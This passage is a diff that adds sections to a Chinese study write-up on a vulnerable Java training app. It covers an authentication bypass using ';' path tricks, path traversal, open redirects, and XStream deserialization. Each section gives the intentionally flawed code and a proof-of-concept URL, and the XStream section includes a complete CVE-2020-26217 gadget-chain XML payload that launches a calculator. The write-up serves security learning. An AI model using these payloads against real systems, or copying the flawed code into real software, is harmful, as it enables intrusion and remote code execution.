@@ -1196,3 +1196,195 @@ for(int i = 0; i < this.numChildren; ++i) {
 > - 上面的for循环我就不说了它的作用了，我们焦点放在previousResult （之前的结果）和result上面。
 > - previousResult = result;首先这行代码使其它们保持一致
 > - 当遍历的节点时候，这时候就会一步步的保存我们的payload最终导致RCE
+
+# GetRequestURI
+
+```java
+public String exclued(HttpServletRequest request) {
+
+    String[] excluedPath = {"/css/**", "/js/**"};
+    String uri = request.getRequestURI(); // Security: request.getServletPath()
+    PathMatcher matcher = new AntPathMatcher();
+
+    logger.info("getRequestURI: " + uri);
+    logger.info("getServletPath: " + request.getServletPath());
+
+    for (String path : excluedPath) {
+        if (matcher.match(path, uri)) {
+            return "You have bypassed the login page.";
+        }
+    }
+    return "This is a login page >..<";
+}
+```
+
+[CVE-2020-5902](https://cloud.tencent.com/developer/article/1659416)
+
+> request.getRequestURL()：返回全路径；
+>
+> **1）分号；**
+>
+>   在URL中遇到;号会将;xxx/中的**分号与斜杠之间的字符串以及分号本身**都去掉
+>
+> **2）斜杆/**
+>
+>   判断是否有连续的/，存在的话则循环删除掉多余的/
+>
+> **3）./和../**
+>
+>  将/./删除掉、将/../进行跨目录拼接处理。
+>
+> 总结一下，分号可用在两种场景：
+>
+> ```javascript
+> /;xxx/实现分割目录
+> /..;/实现跨目录，常用在../被禁用的场景下
+> ;.css或;.js等利用白名单绕过认证鉴权
+> ```
+
+POC:
+
+`http://localhost:8079/css/..;/uri/exclued/vuln`
+
+# PathTraversal
+
+```java
+public String getImage(String filepath) throws IOException {
+    return getImgBase64(filepath);
+}
+private String getImgBase64(String imgFile) throws IOException {
+
+    logger.info("Working directory: " + System.getProperty("user.dir"));
+    logger.info("File path: " + imgFile);
+
+    File f = new File(imgFile);
+    if (f.exists() && !f.isDirectory()) {
+        byte[] data = Files.readAllBytes(Paths.get(imgFile));
+        return new String(Base64.encodeBase64(data));
+    } else {
+        return "File doesn't exist or is not a file.";
+    }
+}
+```
+
+这个没有过滤。
+
+POC:`http://localhost:8079/path_traversal/vul?filepath=../TEST/src/test.java`
+
+# URLRedirect
+
+```java
+@GetMapping("/redirect")
+public String redirect(@RequestParam("url") String url) {
+    return "redirect:" + url;
+}
+
+@RequestMapping("/setHeader")
+@ResponseBody
+public static void setHeader(HttpServletRequest request, HttpServletResponse response) {
+    String url = request.getParameter("url");
+    response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY); // 301 redirect
+    response.setHeader("Location", url);
+}
+
+@RequestMapping("/sendRedirect")
+@ResponseBody
+public static void sendRedirect(HttpServletRequest request, HttpServletResponse response) throws IOException {
+    String url = request.getParameter("url");
+    response.sendRedirect(url); // 302 redirect
+}
+
+@RequestMapping("/forward")
+@ResponseBody
+public static void forward(HttpServletRequest request, HttpServletResponse response) {
+    String url = request.getParameter("url");
+    RequestDispatcher rd = request.getRequestDispatcher(url);
+    try {
+        rd.forward(request, response);
+    } catch (Exception e) {
+        e.printStackTrace();
+    }
+}
+```
+
+前三个都是随便跳转，包括恶意网站。
+
+[forward（转发）与redirect（重定向）的区别](https://blog.csdn.net/zhc5885306/article/details/78763905)
+
+> **转发过程：**客户浏览器发送http请求--->web服务器接受此请求--->调用内部的一个方法在容器内部完成请求处理和转发动作--->将目标资源 发送给客户；在这里，转发的路径必须是同一个web容器下的url，其不能转向到其他的web路径上去，中间传递的是自己的容器内的request。在客 户浏览器路径栏显示的仍然是其第一次访问的路径，也就是说客户是感觉不到服务器做了转发的。转发行为是浏览器只做了一次访问请求。 
+
+# XStreamRce
+
+这里xstream的版本是1.4.10。
+
+```java
+public String parseXml(HttpServletRequest request) throws Exception {
+    String xml = WebUtils.getRequestBody(request);
+    XStream xstream = new XStream(new DomDriver());
+    xstream.fromXML(xml);
+    return "xstream";
+}
+```
+
+**CVE-2020-26217：**
+
+**POC：**
+
+```xml
+<map>
+  <entry>
+    <jdk.nashorn.internal.objects.NativeString>
+      <flags>0</flags>
+      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>
+        <dataHandler>
+          <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
+            <contentType>text/plain</contentType>
+            <is class='java.io.SequenceInputStream'>
+              <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>
+                <iterator class='javax.imageio.spi.FilterIterator'>
+                  <iter class='java.util.ArrayList$Itr'>
+                    <cursor>0</cursor>
+                    <lastRet>-1</lastRet>
+                    <expectedModCount>1</expectedModCount>
+                    <outer-class>
+                      <java.lang.ProcessBuilder>
+                        <command>
+                          <string>calc</string>
+                        </command>
+                      </java.lang.ProcessBuilder>
+                    </outer-class>
+                  </iter>
+                  <filter class='javax.imageio.ImageIO$ContainsFilter'>
+                    <method>
+                      <class>java.lang.ProcessBuilder</class>
+                      <name>start</name>
+                      <parameter-types/>
+                    </method>
+                    <name>start</name>
+                  </filter>
+                  <next/>
+                </iterator>
+                <type>KEYS</type>
+              </e>
+              <in class='java.io.ByteArrayInputStream'>
+                <buf></buf>
+                <pos>0</pos>
+                <mark>0</mark>
+                <count>0</count>
+              </in>
+            </is>
+            <consumed>false</consumed>
+          </dataSource>
+          <transferFlavors/>
+        </dataHandler>
+        <dataLen>0</dataLen>
+      </value>
+    </jdk.nashorn.internal.objects.NativeString>
+    <string>test</string>
+  </entry>
+</map>
+```
+
+用burp抓包，改成post，改一下MIME类型，然后贴上POC，计算器就被打开了。
+
+![xstreamrce1](java-sec-code.assets/xstreamrce1.png)
